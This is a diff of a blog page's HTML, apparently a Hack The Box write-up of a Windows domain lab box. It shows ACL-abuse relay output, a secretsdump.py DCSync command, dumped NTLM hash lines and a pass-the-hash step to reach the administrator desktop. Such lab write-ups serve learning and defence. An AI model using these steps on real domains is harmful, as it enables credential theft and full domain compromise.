 [*] Saved restore state to aclpwn-20191105-184250.restore
 [*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED
-[*] Enumerating relayed user&#39;s privileges. This may take a while on large domains
+[*] Enumerating relayed user's privileges. This may take a while on large domains
 [-] Exception in HTTP request handler: [Errno 32] Broken pipe
 [-] [Errno 32] Broken pipe
 [*] User privileges found: Create user
 [*] User privileges found: Modifying domain ACL
 [-] ACL attack already performed. Refusing to continue
 </code></pre></div>
-
 <h2>DCSync</h2>
 <p>Our right where sufficient to escalate to get the <code>Replication-Get-Changes-All</code>
 privileges on the domain. As mention by <code>ntlmrelayx</code> we can now use a
 <a href="https://adsecurity.org/?p=1729">DCSync</a> attack on the domain using
 <a href="https://github.com/SecureAuthCorp/impacket/">impacket's secretdump.py</a> to get
 the users' passwords hashes.</p>
-<div class="highlight"><pre><span></span><code>python secretsdump.py &#39;htb.local/created_01:M&lt;redacted&gt;@10.10.10.161&#39;
+<div class="highlight"><pre><span></span><code>python secretsdump.py 'htb.local/created_01:M&lt;redacted&gt;@10.10.10.161'
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
@@ -716,7 +650,6 @@ htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16
 htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 &lt;SNIP&gt;
 </code></pre></div>
-
 <h2>PTH</h2>
 <p>We can then use the <a href="http://blog.gentilkiwi.com/tag/pass-the-hash">Path the hash</a>
 technique with
@@ -748,71 +681,49 @@ C:\Users\Administrator&gt;cd Desktop
 C:\Users\Administrator\Desktop&gt;type root.txt
 f04815&lt;redacted&gt;
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>What a journey. This box was classified as easy but probably needed a medium
 classification. WinRM is so <em>finicky</em>. The root part was interesting as it
 allowed us to play with Bloodhound and ntlmrelayx which doesn't happen a lot
 outside of client environments.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/windows.html">windows</a>
-      <a href="../../tag/winrm.html">winrm</a>
-      <a href="../../tag/pth.html">PTH</a>
-      <a href="../../tag/bloodhound.html">bloodhound</a>
-      <a href="../../tag/impacket.html">impacket</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/03/htb-postman.html" title="HTB: Postman">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/04/htb-registry.html" title="HTB: Registry">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/windows.html">windows</a>
+<a href="../../tag/winrm.html">winrm</a>
+<a href="../../tag/pth.html">PTH</a>
+<a href="../../tag/bloodhound.html">bloodhound</a>
+<a href="../../tag/impacket.html">impacket</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/03/htb-postman.html" title="HTB: Postman">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/04/htb-registry.html" title="HTB: Registry">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -823,6 +734,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
